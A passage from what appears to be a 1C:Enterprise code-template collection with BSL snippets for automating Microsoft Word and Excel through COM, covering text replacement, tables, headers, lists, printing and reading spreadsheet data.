				Word.ActiveDocument.Content.Find.Execute(СтароеЗначение,1,,,,,,,,НовоеЗначение,2);	
			КонецЕсли;
		Иначе
			Word.ActiveDocument.Content.Find.Execute(СтароеЗначение,1,,,,,,,,"""",2);	
		Конецесли;
	Исключение
		Сообщить(""Ошибка при замене значения в Word: ""+ОписаниеОшибки(),СтатусСообщения.Важное);
	КонецПопытки;
КонецПроцедуры //ЗаменаВWord 
"}
},
{0,
{"Новый COMОбъект(""Word.Application"")",0,0,"","Попытка
	MSWord = Новый COMОбъект(""Word.Application"");
	ИмяВременногоФайла = ПолучитьИмяВременногоФайла(""DOC"");
	Макет.Записать(ИмяВременногоФайла);
	MSWord.Documents.Open(ИмяВременногоФайла);
Исключение
	Сообщить(""Возможно у вас не установлена программа Microsoft Office: Word (""+ОписаниеОшибки()+"")"");
	Возврат;
КонецПопытки;
"}
},
{0,
{"Заполнение",0,0,"","
Попытка
	MSWord = Новый COMОбъект(""Word.Application"");
	ИмяВременногоФайла = ПолучитьИмяВременногоФайла(""DOC"");
	Макет.Записать(ИмяВременногоФайла);
	MSWord.Documents.Open(ИмяВременногоФайла);
Исключение
	Сообщить(""Возможно у вас не установлена программа Microsoft Office: Word (""+ОписаниеОшибки()+"")"");
	Возврат;
КонецПопытки;

ПараметрыМакета = Новый Массив;
ЗначенияПараметровМакета = Новый Массив;

//ЗаполнитьМассивПараметров

Для параметрМакета = 0 По ПараметрыМакета.Количество() - 1 Цикл
	Попытка
		ЗаменаВWord(MSWord, ПараметрыМакета[параметрМакета], ЗначенияПараметровМакета[параметрМакета]);        
	Исключение
		Сообщить(""Ошибка при выводе шаблона документа в Word: ""+ОписаниеОшибки(),СтатусСообщения.Важное);
		MSWord.Quit();
		MSWord="""";
	КонецПопытки
	
КонецЦикла;

MSWord.Visible=1;
MSWord.Activate();
MSWord.ActiveWindow.WindowState=1;

//Процедура ЗаполнитьМассивПараметров
//-------------------------------------------------------------------------
//Параметры:
//		МассивПараметров - Массив - Параметры которые нужно заменить в макете
//		МассивЗначенийПараметров - Массив - Значения для параметров
//		ПараметрИмя - Строка - Имя параметра (в документе они должны быть в спец символах)
//		ПараметрЗначение - Строка - значение параметра (которое будет подставлена для указанного ПараметрИмя)
//		СпецСимволПараметра - Строка - символ которым обрамляется заменяемое значение в документе. Например ""#"" (для вида #парам#) или ""[]"" (для вида [парам])
//		ОкончаниеПараметра - Строка - Например ""Орг"" для организации. Для вида ПараметрОрг
//-------------------------------------------------------------------------
//Порядок параметров в  МассивЗначенийПараметров должен соответствовать порядку параметро в МассивПараметров.
//Тоесть, первый элемент МассивПараметров будет заполнен значением первого элемента из МассивЗначенийПараметров и тд.
//-------------------------------------------------------------------------
//автор: Кучеров Р 06.06.2018 
&НаСервереБезКонтекста
Процедура ЗаполнитьМассивПараметров(МассивПараметров, МассивЗначенийПараметров, ПараметрИмя, ПараметрЗначение, СпецСимволПараметра = ""#"", ОкончаниеПараметра = """")
	
	Если СпецСимволПараметра = ""[]"" Тогда
		МассивПараметров.Добавить(""["" + ПараметрИмя + ОкончаниеПараметра + ""]"");
	Иначе
		МассивПараметров.Добавить(СпецСимволПараметра + ПараметрИмя + ОкончаниеПараметра + СпецСимволПараметра);
	КонецЕсли; 
	
	МассивЗначенийПараметров.Добавить(ПараметрЗначение);
	
КонецПроцедуры // ЗаполнитьМассивПараметров()
"}
},
{0,
{"УчетПустойСтроки",0,0,"","//Функция УчетПустойСтроки
//-------------------------------------------------------------------------
//Параметры:
//		ЭлементУчета - Любой - Будет обработан переводом в строку
//		КоличествоСимволовЗамены - Число - Сколько символов отведено под эту запись
//		СимволЗамены - Строка - Какие символы отведены под эту запись
//Возвращаемое значение:
//		Строка - Вида: ""   "", ""_____"", ""#####"" и т.д.
//-------------------------------------------------------------------------
//автор: Кучеров Р 06.06.2018
&НаКлиентеНаСервереБезКонтекста
Функция УчетПустойСтроки(ЭлементУчета, КоличествоСимволовЗамены = 1, СимволЗамены = """")
	
	ЭлементУчетаСтрока = ?(ТипЗнч(ЭлементУчета) = Тип(""Строка""), ЭлементУчета, Строка(ЭлементУчета));
	
	Если ПустаяСтрока(ЭлементУчетаСтрока) Тогда
		Если НЕ ПустаяСтрока(СимволЗамены) ИЛИ СимволЗамены = "" "" Тогда
			РезультатЭлементУчетаСтрока = """";
			
			Для ии = 1 По КоличествоСимволовЗамены Цикл
				
				РезультатЭлементУчетаСтрока = РезультатЭлементУчетаСтрока + СимволЗамены;
				
			КонецЦикла;
		Иначе
			РезультатЭлементУчетаСтрока = """";
		КонецЕсли;
	Иначе 
		Возврат ЭлементУчетаСтрока;
	КонецЕсли; 
	
	Возврат РезультатЭлементУчетаСтрока;
	
КонецФункции // УчетПустойСтроки()"}
},
{0,
{"Замена подробно",0,0,"","wrdApp = Новый COMОбъект(""Word.Application"");

wrdDoc = wrdApp.Documents.Open(""C:\!Work\Word.docx"");
wrdDoc.Activate();
wrdApp.Visible = True;

wrdApp.Selection.Find.ClearFormatting();
wrdApp.Selection.Find.Replacement.ClearFormatting();
wrdApp.Selection.Find.Text = """"; //строка поиска
wrdApp.Selection.Find.Replacement.Text = """";  //строка замены
wrdApp.Selection.Find.Forward = True;
wrdApp.Selection.Find.Wrap = 1;
wrdApp.Selection.Find.Format = False;
wrdApp.Selection.Find.MatchCase = False;
wrdApp.Selection.Find.MatchWholeWord = False;
wrdApp.Selection.Find.MatchWildcards = False;
wrdApp.Selection.Find.MatchSoundsLike = False;
wrdApp.Selection.Find.MatchAllWordForms = False;
wrdApp.Selection.Find.Execute( , , , , , , , , , , 2);
wrdDoc.Save();"}
},
{0,
{"Замена в колонтитулах (Headers, Footers)",0,0,"","// для верхнего колонтитула ""Headers""
Документ.Sections(1).Headers(1).Range.Find.Execute(""[значениеДляЗамены]"", Ложь, Истина, Ложь, , , Истина, , Ложь, переменнаяСНужнымТекстом, 2);

// для нижнего колонтитула ""Footers""
Документ.Sections(1).Footers(1).Range.Find.Execute(""[значениеДляЗамены]"", Ложь, Истина, Ложь, , , Истина, , Ложь, переменнаяСНужнымТекстом, 2);
"}
},
{0,
{"Печать сертификатов",0,0,"","//Печать сертификатов
Для Каждого Строка Из СертификатыНаПечать Цикл
	
	ФайлСертификата = Новый Файл(Строка.ИмяФайла);
	Если ФайлСертификата.Существует() Тогда
		Ворд = Новый COMОбъект(""Word.Application"");;
		Документ = Ворд.Documents.Open(Строка.ИмяФайла, -1);
		Колонтитул = Документ.Sections.First.Headers(1).Range;
		Колонтитул.Font.Name = ""Arial"";
		Колонтитул.Font.Size = 10;
		Колонтитул.Text = Строка(ДокументОбъект.Ссылка) + ""    "" + Строка(ДокументОбъект.Контрагент);
		Документ.PrintOut();
		Документ.Close(0);
		Документ="""";
	КонецЕсли;
	
КонецЦикла;"}
},
{0,
{"Пример работы с Word через OLE. Часть 1",0,0,"","Процедура ВыполнитьОбработку() Экспорт

    Попытка
        Объект = ПолучитьCOMОбъект(ПутьКФайлу);
        // Покажем документ. Для красоты.
        Объект.Application.Visible = 1;
        Word = Объект.Application;

        Doc = Объект.Application.Documents(1);
        Doc.Activate();

        // Готовим переменную в которой будет содержимое нашего документа
        // (текст, таблицы и проч).
        Text = Word.Selection;

        // Очистим документ
        // Ctrl-A
        Text.WholeStory();
        // Del
        Text.Delete(1, 1);
        // Двигаемся на 3 строки ниже. Документ пустой, поэтому добавляем
        // строки ""Переводами коретки""

        Text.TypeText(Символы.ВК);
        Text.TypeText(Символы.ВК);
        Text.TypeParagraph(); // другой вариант того же действия
        // Выводим текст.
        Text.TypeText(""Обычный текст, набранный первую очередь"");

        // Курсор в конце строки
        // Эмулируем нажатие Shift+Home - выделяем строку
        Text.HomeKey(, 1);
        // Форматирование выделенной строки
        Text.Font.Bold = 9999998;
        Text.Font.Size = 14;
        Text.Font.Name = ""Verdana"";

        // Сдвигаем курсор. Сдвинуть курсор по строкам возможно, только,
        // если эти строки уже содержат текст, иначе ничего не произойдет.
        Text.MoveUp(,2);   // вверх на 2 строки
        //Word.Selection.MoveDown(,числострок); // вниз
        //Word.Selection.MoveLeft(,числострок); // влево
        //Word.Selection.MoveRight(,числострок);// вправо

        // Добавление текста. Текст выводится начиная с текщей позиции
        // курсора.
        Text.HomeKey(, 1);
        Text.TypeText(""Обычный текст, набранный во вторую очередь"");

        Text.MoveDown(,1); // вниз на 2 строки
        Text.EndKey(); // в конец строки
        Text.TypeParagraph(); // и в начало следующей строки

        // Очищаем форматирование
        Text.ClearFormatting();
        // Добавляем таблицу.
        // Получаем текущую позицию курсора
        Position = Text.Range();

        // Параметры: Позиция, число строк, число колонок,
        // последние 2 параметра отвечают за автоподбор высоты и отображение
        // границ таблицы
        Table = Doc.Tables.Add(Position, 1, 6, 1, 2);

        // Устанавливаем ширину колонок
        Table.Columns(1).PreferredWidth=10;
        Table.Columns(2).PreferredWidth=50;
        Table.Columns(3).PreferredWidth=10;
        Table.Columns(4).PreferredWidth=10;
        Table.Columns(5).PreferredWidth=10;
        Table.Columns(6).PreferredWidth=10;

        // Задаем заголовки колонок
        Row1=Table.Rows(1);
        Row1.Cells(1).Range.Text=""№ п/п"";
        Row1.Cells(2).Range.Text=""Наименование"";
        Row1.Cells(4).Range.Text=""Кол-во"";
        Row1.Cells(3).Range.Text=""Ед. изм."";
        Row1.Cells(5).Range.Text=""Цена,руб."";
        Row1.Cells(6).Range.Text=""Сумма,руб."";

        // Построчно выводим содержимое таблицы Товары
        НомерСтроки = 1;
        Для каждого СтрокаТовары Из Ссылка.Товары Цикл
            Row=Table.Rows.Add();
            Row.Cells(1).Range.Text=НомерСтроки;
            // Выравнивание по левому краю
            Row.Cells(1).Range.ParagraphFormat.Alignment = 1;
            // В качестве текста можно передать только значение ""простого"" формата
            // все агрегатные объекты, переданные как текст, что нормально для платформы 1с
            // вызовут исключение.
            Row.Cells(2).Range.Text=СтрокаТовары.Номенклатура.Наименование
                   +?(ЗначениеЗаполнено(СтрокаТовары.ХарактеристикаНоменклатуры),
                   "" (""+СтрокаТовары.ХарактеристикаНоменклатуры+"")"","""");
            Row.Cells(4).Range.Text=Строка(СтрокаТовары.Количество);
            Row.Cells(4).Range.ParagraphFormat.Alignment = 1;
            Row.Cells(3).Range.Text=?(ЗначениеЗаполнено(СтрокаТовары.Номенклатура.БазоваяЕдиницаИзмерения)
                                  ,СтрокаТовары.Номенклатура.БазоваяЕдиницаИзмерения.Наименование,""-"");
            Row.Cells(3).Range.ParagraphFormat.Alignment = 1;
            Row.Cells(5).Range.Text=Формат(СтрокаТовары.Цена,""ЧДЦ=2"");
            Row.Cells(5).Range.ParagraphFormat.Alignment = 1;
            Row.Cells(6).Range.Text=Формат(СтрокаТовары.Сумма,""ЧДЦ=2"");
            Row.Cells(6).Range.ParagraphFormat.Alignment = 1;
            НомерСтроки=НомерСтроки+1;
        КонецЦикла;

        // Задаем форматирование первой строки
        // Если сделать это сразу, то все новые строки таблицы будут
        // формироваться с тем же форматом
        Row1.Range.Font.Bold = 9999998;
        Row1.Range.Font.Size = 14;
        Row1.Range.Font.Name = ""Verdana"";
        Row1.Range.ParagraphFormat.Alignment = 1;

        // Последняя строка...
        Row = Table.Rows.Add();
        Row.Range.Font.Bold = 9999998;
        Row.Cells(1).Range.Text=""Итого:"";
    Исключение
        Doc.Save();
        Сообщить(ОписаниеОшибки());
        Объект.Application.Quit();
        Объект = Неопределено;
    КонецПопытки;

    Попытка // эта конструкция выдает исключительную ситуацию, но при этом
        // результат все-равно работает))
        // объединяем ячейки в конце таблицы
        Table.cell(НомерСтроки+1, 1).Merge(Table.cell(НомерСтроки+1, 5));
    Исключение
    КонецПопытки;

    Попытка
        Row.Cells(1).Range.ParagraphFormat.Alignment = 3;
        Row.Cells(2).Range.Text=Формат(Ссылка.Товары.Итог(""Сумма""), ""ЧДЦ=2"");
        Row.Cells(2).Range.ParagraphFormat.Alignment = 1;

        Doc.Save();
        Объект.Application.Quit();
        Объект = Неопределено;
    Исключение
        Doc.Save();
        Сообщить(ОписаниеОшибки());
        Объект.Application.Quit();
        Объект = Неопределено;
    КонецПопытки;

КонецПроцедуры"}
},
{0,
{"Пример работы с Word через OLE. Часть 2",0,0,"","Процедура ВыполнитьОбработку() Экспорт

    Попытка

        //Объект = ПолучитьCOMОбъект(ПутьКФайлу);
        Объект = ПолучитьCOMОбъект(""C:\Users\NKrylov\Desktop\Тест.docx"");
        // Покажем документ.
        Объект.Application.Visible = 1;
        Word = Объект.Application;

        ThisDocument = Word.Documents(1);
        ThisDocument.Activate();

        // Отключим проверку грамматики и вывод информации о грамматических ошибках.
        ThisDocument.GrammarChecked=0;
        ThisDocument.ShowGrammaticalErrors=0;

        // Готовим переменную в которой будет содержимое документа (текст).
        Selection = Word.Selection;

        // Очистим документ
        // Ctrl-A
        Selection.WholeStory();
        // Del
        Selection.Delete(1, 1);

        // Уменьшим междустрочный интервал.
        Selection.ParagraphFormat.LineSpacingRule = 0; // 1 по умолчанию
        Selection.ParagraphFormat.SpaceAfter = 0;      // 10 по умолчанию

        // Разметим документ. Это можно сделать и предварительно в макете
        ThisDocument.Bookmarks.Add(""Закладка1"", Selection.Range());
        Selection.TypeParagraph();
        Selection.TypeText(""34r3 "");
        Selection.HomeKey(, 1);
        ThisDocument.Bookmarks.Add(""Закладка2"", Selection.Range());
        Selection.EndKey();
        Selection.TypeParagraph();
        ThisDocument.Bookmarks.Add(""Закладка3"", Selection.Range());
        Selection.TypeParagraph();
        ThisDocument.Bookmarks.Add(""Закладка4"", Selection.Range());
        Selection.EndKey();

        // Так можно работать с текстом только в конкреной области документа - это и будет замена метода Find-Execute. 
        ThisDocument.Bookmarks(""Закладка3"").Range.Select();
        Selection = Word.Selection;

        Bookmark = ThisDocument.Bookmarks(""Закладка3"");
        Table = ThisDocument.Tables.Add(Bookmark.Range(),1,5,1,2);
        Table.Rows(1).Cells(1).Range.Text = 1;
        Table.Rows(1).Cells(2).Range.Text = 2;
        Table.Rows(1).Cells(3).Range.Text = 3;
        Table.Rows(1).Cells(4).Range.Text = 4;
        Table.Rows(1).Cells(5).Range.Text = 5;

        // После вывода таблицы, появится ""лишняя строка"", удалим ее
        // в результате курсор встанет в область закладки 4
        Selection.MoveDown(, 1);
        Selection.Delete(1, 1);

        // Этот текст будет выведен не с последней позиции курсора, а в активной области.
        // в данном случае - в области закладки 2
        ThisDocument.Bookmarks(""Закладка2"").Range.Select();
        Selection = Word.Selection;
        Text = Selection.Range.Text;
        Selection.TypeText(Text + "" sdcsdcs"");
        // При выводе текста закладка ""сбросилась"". Восстановим.
        // ""Победить"" эту проблему я так и не смог((
        // Хотя на практике, закладка больше и не понадобится.
        // Дважды выводить текст в одну и ту же область - не имеет смысла.
        Selection.HomeKey(, 1);
        ThisDocument.Bookmarks.Add(""Закладка2"", Selection.Range());
        Selection.EndKey();

        // В области закладки 4 сформируем нумерованный список
        ThisDocument.Bookmarks(""Закладка4"").Range.Select();
        Selection = Word.Selection; // активная (выделенная) область будет начинаться
        // от закладки 4)

        // Добавим текст ""для опытов""
        // 1
        Selection.TypeText(""sdcsdcsdcsdc"");
        Selection.TypeParagraph();
        // 2
        Selection.TypeText(""sdcsdcsdcsdc"");
        Selection.TypeParagraph();
        // 3
        Selection.TypeText(""sdcsdcsdcsdc"");
        Selection.TypeParagraph();
        // 4
        Selection.TypeText(""sdcsdcsdcsdc"");
        Selection.TypeParagraph();
        // Выделяем введенный текст
        Selection.MoveUp(,4,1);

        // Настроим шаблон объекта галереи списков
        // Галереи списков бывают несккольких типов, 2 - нумерованные списки
        ListTemplate = Word.ListGalleries(2).ListTemplates(1).ListLevels(1);
        // Формат нумератора списка - точка после символа нумерации
        ListTemplate.NumberFormat = ""%1."";
        // стиль нумератора - арабские цифры
        ListTemplate.NumberStyle = 0; // wdListNumberStyleArabic
        // 4 - маленькие латинские буквы.
        // 2 - маленькие римские цифры.
        // 58- меленькие русские буквы.
        // Font = Template.Font; // можно указать форматирование текста списка

        // Применим шаблон к выделенному тексту
 Selection.Range.ListFormat.ApplyListTemplateWithLevel( Word.ListGalleries(2).ListTemplates(1));

        // Перейдем в конец текста
        Selection.EndKey(6);

        // Добавим картинку
        // Параметры: путь к файлу, создавать ссылку на картинку, сохранять с файлом
        Picture = Selection.InlineShapes.AddPicture(""C:\Users\NKrylov\Desktop\Новый.bmp"", Ложь, Истина);
        // Зададим размер
        Picture.Height = 100;
        Picture.Width  = 150;

        // Чтобы установить обтекание текста, конвертируем рисунок в фигуру
        Shape = Picture.ConvertToShape();
        Shape.WrapFormat.Type = 0; // по контуру...

        ThisDocument.Save();
        //Объект.Application.Quit();
        Объект = Неопределено;
    Исключение
        ThisDocument.Save();
        Сообщить(ОписаниеОшибки());
        //Объект.Application.Quit();
        Объект = Неопределено;
    КонецПопытки;

КонецПроцедуры"}
},
{0,
{"Удалиить межстрочный интервал",0,0,"","ПечатнаяФорма.COMСоединение.Application.Selection.WholeStory(); // Выделяем весь текст

ParagraphFormat = ПечатнаяФорма.COMСоединение.Selection.ParagraphFormat; // Обращаемся к формату параграфов 

// Удаляем интервал
ParagraphFormat.SpaceBeforeAuto = False;
ParagraphFormat.SpaceAfterAuto 	= False;
ParagraphFormat.SpaceBefore = 0;
ParagraphFormat.SpaceAfter 	= 0;

// Снять выделение 
ПечатнаяФорма.COMСоединение.ActiveDocument.Range(0, 0).Select();
"}
},
{0,
{"Задание полей",0,0,"","// Можно выполнять после формирования документа
ЛевыйОтступ = 2;
ПечатнаяФорма.COMСоединение.Application.Selection.PageSetup.LeftMargin = Макет.COMСоединение.Documents.Application.CentimetersToPoints(ЛевыйОтступ);
//RightMargin"}
},
{0,
{"Установить заголовок",0,0,"","sTitle 	= doc.BuiltInDocumentProperties(""Title"").Value
doc.BuiltInDocumentProperties(""Title"").Value 	= ""A different title""

Или
лСвойства 			= Документ.BuiltInDocumentProperties(""Title"");
лСвойства.Value 	= Строка(лИмяЗаголовка);"}
},
{0,
{"Добавить таблицу (ConvertToTable)",0,0,"","Документ.Paragraphs.Add();
//подготовка таблицы:
Rng 	= Word.Selection.Range;
//Формируем заголовок:
Rng.InsertAfter(""№*Наименование*Кол-во*Ед*Цена с НДС*Сумма с НДС*Срок поставки"");  
Rng.InsertParagraphAfter();
//сама таблица
НомерСтроки 	= 1;
Для Каждого СтрокаНоменклатуры Из ТаблицаНоменклатуры Цикл
	Rng.InsertAfter(СокрЛП(НомерСтроки)+
	""*""+СокрЛП(СтрокаНоменклатуры.Номенклатура)+
	""*""+Формат(СтрокаНоменклатуры.Количество, ""ЧРД=,; ЧРГ="")+
	""*""+СокрЛП(СтрокаНоменклатуры.ЕдиницаИзмерения)+
	""*""+ Формат(СтрокаНоменклатуры.Цена, ""ЧДЦ=2; ЧРД=,; ЧРГ=' '"")+
	""*""+Формат(СтрокаНоменклатуры.Сумма, ""ЧДЦ=2; ЧРД=,; ЧРГ=' '"") + 
	""*"" + ?(СтрокаНоменклатуры.СрокПоставки <> 0 ,ЧислоПрописью(СтрокаНоменклатуры.СрокПоставки, ФормСтрока, ПарПредметаСрок), """"));
	Rng.InsertParagraphAfter();
	НомерСтроки 	= НомерСтроки + 1;
КонецЦикла;   

Rng.ConvertToTable(""*"");

Если Документ.Tables.Count >= 2 Тогда
	Документ.Tables(2).AutoFormat(16);
КонецЕсли;"}
},
{0,
{"Заголовк и имя сохраняемого файла (ActiveDocument.Caption, Dialog.title)",0,0,"","MSWord.ActiveDocument.Caption 	= ""Служебная записка Иванов И.И"";
Dialog 			= MSWord.Dialogs(86);
Dialog.title 	= ""Служебная записка Иванов И.И"";
Dialog.execute();"}
}
},
{8,
{"Excel",1,0,"",""},
{0,
{"Скелет формирования Excel выгрузки",0,0,"","// Загрузка объекта Microsoft Excel
Попытка
	Состояние(""Выгрузка данных из 1С в Microsoft Excel..."");            
	ExcelПриложение = Новый COMОбъект(""Excel.Application"");
Исключение
	Сообщить(""Ошибка при запуске Microsoft Excel."" + Символы.ПС + ОписаниеОшибки(), СтатусСообщения.Внимание);
	Возврат;
КонецПопытки;

// Создадим книгу, по умолчанию в ней уже есть листы
Книга = ExcelПриложение.WorkBooks.Add();

// Используем первый лист книги Excel
Лист 	= Книга.WorkSheets(1);

// Сформировать шапку документа в первой строке листа
Лист.Cells(1,1).Value = ""1"";

// Сохраним созданную книгу в файл xls
//Книга.SaveAs(ПутьФайла);

// Обязательно закроем соединение с COM объектом для освобождения памяти
ExcelПриложение.Quit();
"}
},
{0,
{"КоличествоСтрок",0,0,"","КоличествоСтрок = ТекЛист.UsedRange.Rows.Count;"}
},
{0,
{"КоличествоКолонок",0,0,"","КоличествоКолонок = ТекЛист.UsedRange.Columns.Count;"}
},
{0,
{"Количество строк и колонок",0,0,"","//Получим количество строк и колонок.
//В разных версиях Excel получаются по-разному, поэтому сначала определим версию Excel
Версия = Лев(Excel.Version,Найти(Excel.Version,""."")-1);
Если Версия = ""8"" Тогда
	ФайлСтрок   = Excel.Cells.CurrentRegion.Rows.Count;
	ФайлКолонок = Excel.Cells.CurrentRegion.Columns.Count;
Иначе
	ФайлСтрок   = Excel.Cells(1,1).SpecialCells(11).Row;
	ФайлКолонок = Excel.Cells(1,1).SpecialCells(11).Column;
КонецЕсли;"}
},
{0,
{"СкелетОбработки и выбор файла",0,0,"","// Открытие файла
ДиалогВыбораФайла = Новый ДиалогВыбораФайла(РежимДиалогаВыбораФайла.Открытие);

ДиалогВыбораФайла.Заголовок = ""Прочитать табличный документ из файла"";
ДиалогВыбораФайла.Фильтр    = ""Лист Excel 2007 (*.xlsx)|*.xlsx|Лист Excel (*.xls)|*.xls"";
Если ДиалогВыбораФайла.Выбрать() Тогда
	
	//ТабличныйДокумент = ЭлементыФормы.ТабличныйДокумент;
	ВыбФайл = Новый Файл(ДиалогВыбораФайла.ПолноеИмяФайла);
	ВыбрФайл = ВыбФайл.ПолноеИмя;
	
	Если нРег(ВыбФайл.Расширение) = "".xlsx"" Тогда
		//мПрочитатьТабличныйДокументИзExcel(ТабличныйДокумент,ДиалогВыбораФайла.ПолноеИмяФайла);
		//очисткафайла(Число(Номермесяца),ДиалогВыбораФайла.ПолноеИмяФайла)  ;
	ИначеЕсли нРег(ВыбФайл.Расширение) = "".xls"" Тогда
		//мПрочитатьТабличныйДокументИзExcel(ТабличныйДокумент,ДиалогВыбораФайла.ПолноеИмяФайла);
		//очисткафайла(Число(Номермесяца),ДиалогВыбораФайла.ПолноеИмяФайла)  ;
		
		//ИначеЕсли нРег(ВыбрФайл.Расширение) = "".txt"" Тогда
		//	мПрочитатьТабличныйДокументИзТекста(ТабличныйДокумент,ДиалогВыбораФайла.ПолноеИмяФайла);
		//ИначеЕсли нРег(ВыбрФайл.Расширение) = "".dbf"" Тогда
		//	мПрочитатьТабличныйДокументИзDBF(ТабличныйДокумент,ДиалогВыбораФайла.ПолноеИмяФайла);
	КонецЕсли;
	
КонецЕсли;

// Обработка
ВыбФайл = Новый Файл(ВыбрФайл);
Если НЕ ВыбФайл.Существует() Тогда
	Сообщить(""Файл не существует!"");
	Возврат ;
КонецЕсли;

// Формирование таблицы данных
ТЗ = Новый ТаблицаЗначений;
ТЗ.Колонки.Добавить(""Номенклатура"");
ТЗ.Колонки.Добавить(""Код"");

// Чтение Excel
НомерПервойСтроки = 13;

//подключаемся к эксель
Попытка
	Excel = Новый COMОбъект(""Excel.Application"");
	Excel.WorkBooks.Open(ВыбрФайл);
	Состояние(""Обработка файла Microsoft Excel..."");
Исключение
	Сообщить(""Ошибка при открытии файла с помощью Excel! Загрузка не будет произведена!"");
	Сообщить(ОписаниеОшибки());
	Возврат;
КонецПопытки;

Попытка
	//Открываем необходимый лист
	//+++ АйТи КучеровРМ 14.08.2018 ТЗ № ИС00-004597
	НомерЛистаДляОбработки = Неопределено;
	
	КоличествоЛистров = Excel.Workbooks(1).Sheets.Count;
	Если НомерЛиста = 0 Тогда
		Для Лист = 1  По КоличествоЛистров Цикл
			Если ВРег(СокрЛП(Excel.Sheets(Лист).Name)) = ""БЛАНК"" Тогда
				НомерЛистаДляОбработки = Лист;
				Прервать;
			КонецЕсли; 	
		КонецЦикла;
	КонецЕсли; 
	
	Если НомерЛиста > КоличествоЛистров Тогда
		НомерЛиста = КоличествоЛистров;
	КонецЕсли;
	
	Если НомерЛиста = 0 И НомерЛистаДляОбработки <> Неопределено Тогда
		Excel.Sheets(НомерЛистаДляОбработки).Select(); // лист 1, по умолчанию	
	Иначе
		Excel.Sheets(НомерЛиста).Select(); // лист 1, по умолчанию
	КонецЕсли;
	//--- АйТи КучеровРМ 14.08.2018 ТЗ № ИС00-004597
Исключение
	//Закрываем Excel
	Excel.ActiveWorkbook.Close();
	Excel = 0;
	Сообщить(""Файл ""+Строка(ВыбрФайл)+"" не соответствует необходимому формату! Первый лист не найден!"");
	Возврат;
КонецПопытки;

ФайлСтрок   = 0;
ФайлКолонок = 0;

//Получим количество строк и колонок.
//В разных версиях Excel получаются по-разному, поэтому сначала определим версию Excel
Версия = Лев(Excel.Version,Найти(Excel.Version,""."")-1);
Если Версия = ""8"" Тогда
	ФайлСтрок   = Excel.Cells.CurrentRegion.Rows.Count;
	ФайлКолонок = Макс(Excel.Cells.CurrentRegion.Columns.Count, 13);
Иначе
	ФайлСтрок   = Excel.Cells(1,1).SpecialCells(11).Row;
	ФайлКолонок = Excel.Cells(1,1).SpecialCells(11).Column;
КонецЕсли;

Попытка //Если случится ошибка, то закроем файл, чтобы не висел в процессах
	
	ПредыдущееОписание = """";
	
	Для Сч = НомерПервойСтроки По ФайлСтрок Цикл
		Состояние(""Обрабатывается строка "" + Строка(Сч) + "" из "" + Строка(ФайлСтрок));
		
		Если СокрЛП(Excel.Cells(Сч, 16).Value) = """" ИЛИ СокрЛП(Excel.Cells(Сч, 1).Value) = """" Тогда
			Продолжить;
		КонецЕсли;
		
		НоваяСтрока                        = ТЗ.Добавить();
		НоваяСтрока.Код                    = СтрЗаменить(СокрЛП(Excel.Cells(Сч, 1).Value), Символ(160), """");
		НоваяСтрока.КоличествоВКоробке     = Число(СокрЛП(Excel.Cells(Сч, 3).Value));
		НоваяСтрока.ЦенаЗаШтукуБезНДС      = Число(СокрЛП(Excel.Cells(Сч, 7).Value));
		НоваяСтрока.ЦенаЗаШтукуСНДС        = Число(СокрЛП(Excel.Cells(Сч, 8).Value));
		НоваяСтрока.ЦенаЗаКоробкуБезНДС    = Число(СокрЛП(Excel.Cells(Сч, 10).Value));
		НоваяСтрока.ЦенаЗаКоробкуСНДС      = Число(СокрЛП(Excel.Cells(Сч, 11).Value));
		НоваяСтрока.КоличествоЗаказано     = Число(СокрЛП(Excel.Cells(Сч, 16).Value));
		НоваяСтрока.КоличествоЗаказаноШтук = 0;
		НоваяСтрока.ЦенаДляДокумента       = 0;
		НоваяСтрока.СуммаБезНДС            = Число(СокрЛП(Excel.Cells(Сч, 17).Value));
		НоваяСтрока.СуммаСНДС              = Число(СокрЛП(Excel.Cells(Сч, 19).Value));
		
		НоваяСтрока.КолАкции               = ?(СокрЛП(Excel.Cells(Сч, 21).Value) = """", 0, Число(СокрЛП(Excel.Cells(Сч, 21).Value)));
		НоваяСтрока.КолБрак                = ?(СокрЛП(Excel.Cells(Сч, 22).Value) = """", 0, Число(СокрЛП(Excel.Cells(Сч, 22).Value)));
		НоваяСтрока.КолСеминары            = ?(СокрЛП(Excel.Cells(Сч, 23).Value) = """", 0, Число(СокрЛП(Excel.Cells(Сч, 23).Value)));
		НоваяСтрока.КолПрочие              = ?(СокрЛП(Excel.Cells(Сч, 24).Value) = """", 0, Число(СокрЛП(Excel.Cells(Сч, 24).Value)));
		
		// КодСимвола(Сред(СокрЛП(Excel.Cells(Сч, 1).Value), 3, 1))
		
	КонецЦикла;
Исключение
	//Закрываем Excel
	Excel.ActiveWorkbook.Close();
	Excel.Quit();
	Сообщить(ОписаниеОшибки());
	Возврат;
КонецПопытки;

Попытка
	Сообщить(""Файл Excel прочитан!"");
	Excel.DisplayAlerts = 0; 
	Excel.Quit();
	Excel.DisplayAlerts = 1;
Исключение
	Сообщить(ОписаниеОшибки());
	Возврат;
КонецПопытки;"}
},
{0,
{"Поиск первой значимой строки",0,0,"","НомерПервойСтроки = 0;
Для Сч = 1 По ФайлСтрок Цикл // Поиск первой значимой строки
	<?""Имя элемента для поиска (для переменной, т.е. слитно)""> = СокрЛП(Excel.Cells(Сч, 1).Value);
	Если ЭтоЧисло(<?""Имя элемента для поиска (для переменной, т.е. слитно)"">) Тогда
		НомерПервойСтроки = Сч;
		Прервать;
	КонецЕсли; 
КонецЦикла;"}
},
{0,
{"Ошибка открытия файла Эксель на сервере",0,0,"","Excel, Ошибка открытия файла Эксель на сервере.
Следующий код работает на клиенте, но не работает на сервере. 
    ExcelПриложение = Новый COMОбъект(""Excel.Application"");
    ExcelПриложение.WorkBooks.Open(ИмяФайла);
	
С ошибкой: Ошибка при вызове метода контекста (Open) 
ExcelПриложение.WorkBooks.Open(ИмяФайла); 
по причине: 
Произошла исключительная ситуация (Microsoft Office Excel): Нет доступа к файлу '\\Sd\test\KPI.xls'. Это может быть вызвано одной из следующих причин. 
• Имени файла или пути не существует. 
• Файл используется другой программой. 
• Имя книги, которую вы пытаетесь сохранить, совпадает с именем открытой в данный момент книги.

Причина:
Эксель не предназначен для работы на сервере, ищет папку ""Desktop"" при её отсутствии падает
	
Решение:
Создать папку C:\Windows\SysWOW64\config\systemprofile\Desktop или C:\Windows\System32\config\systemprofile\Desktop (в зависимости от разрядности вашей системы)
"}
},
{0,
{"ЗЯ (Значение Ячейки)",0,0,"","Функция ЗЯ(Страница, Стр, Кол) //Значение Ячейки
